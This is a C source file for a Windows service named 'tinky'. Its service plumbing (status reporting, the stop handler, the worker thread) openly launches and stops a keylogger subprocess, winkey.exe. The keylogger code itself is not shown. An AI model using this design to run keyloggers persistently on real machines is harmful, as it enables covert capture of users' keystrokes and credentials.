/**
 * @file service.c
 * @brief Implementation of standard Windows Service plumbing and control flows.
 */

#include "tinky.h"


/**
 * @brief Updates the status of the service to the Service Control Manager.
 * 
 * Provides details on the current service state (e.g., running, stopped, starting) to SCM
 * so that control tools (like `sc` or `services.msc`) understand what the service is doing.
 * 
 * @param dwCurrentState The new state of the service (e.g., SERVICE_RUNNING).
 */
void ReportServiceStatus(DWORD dwCurrentState)
{
    static DWORD dwCheckPoint = 1;

    g_ServiceStatus.dwCurrentState  = dwCurrentState;
    g_ServiceStatus.dwWin32ExitCode = NO_ERROR;
    g_ServiceStatus.dwWaitHint      = 3000;

    g_ServiceStatus.dwControlsAccepted =
        (dwCurrentState == SERVICE_RUNNING)
        ? (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN)
        : 0;

    g_ServiceStatus.dwCheckPoint =
        (dwCurrentState == SERVICE_RUNNING || dwCurrentState == SERVICE_STOPPED)
        ? 0
        : dwCheckPoint++;

    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

/**
 * @brief Extended handler function to control events like STOP and SHUTDOWN sent by SCM.
 * 
 * Handles incoming events from the OS or administrator. When requested to stop, sets the
 * service stop event to wake up the worker/main thread.
 * 
 * @param dwCtrl The control code requested (e.g. SERVICE_CONTROL_STOP).
 * @param dwEventType Type of event.
 * @param lpEventData Additional event data.
 * @param lpContext User-defined context.
 * @return DWORD Win32 error code.
 */
DWORD WINAPI ServiceCtrlHandlerEx(DWORD dwCtrl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext)
{
    (void)dwEventType; (void)lpEventData; (void)lpContext;

    switch (dwCtrl) {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        ReportServiceStatus(SERVICE_STOP_PENDING);
        SetEvent(g_ServiceStopEvent);
        return NO_ERROR;
    default:
        break;
    }
    return NO_ERROR;
}

/**
 * @brief Background worker thread that monitors service execution and performs periodic tasks.
 * 
 * Runs in a loop, sleeping for 1-second intervals by waiting on the service stop event.
 * If the stop event is set, the loop terminates immediately.
 * 
 * @param lpParam User parameters.
 * @return DWORD Thread exit code.
 */
DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
{
    (void)lpParam;
    while (WaitForSingleObject(g_ServiceStopEvent, 1000) == WAIT_TIMEOUT) {
        /* idle; add watchdog/restart logic here if desired */
    }
    return ERROR_SUCCESS;
}

/**
 * @brief The main entry point function for the tinky service.
 * 
 * Registers the control handler, reports starting status, initializes locks, spawns the 
 * keylogger subprocess (winkey.exe), runs the background worker thread, and finally 
 * cleans up and reports stopped status when SCM signals a stop.
 * 
 * @param argc Number of command-line arguments.
 * @param argv Array of command-line arguments.
 */
VOID WINAPI ServiceMain(DWORD argc, LPSTR *argv)
{
    HANDLE hThread;
    (void)argc; (void)argv;

    InitializeCriticalSection(&g_ProcLock);

    g_StatusHandle = RegisterServiceCtrlHandlerExA(
        SERVICE_NAME, ServiceCtrlHandlerEx, NULL);
    if (!g_StatusHandle) return;

    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ReportServiceStatus(SERVICE_START_PENDING);

    g_ServiceStopEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    if (!g_ServiceStopEvent) {
        g_ServiceStatus.dwWin32ExitCode = GetLastError();
        ReportServiceStatus(SERVICE_STOPPED);
        return;
    }

    StartWinkey();

    ReportServiceStatus(SERVICE_RUNNING);

    hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);
    WaitForSingleObject(g_ServiceStopEvent, INFINITE);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    StopWinkey();

    CloseHandle(g_ServiceStopEvent);
    DeleteCriticalSection(&g_ProcLock);

    ReportServiceStatus(SERVICE_STOPPED);
}
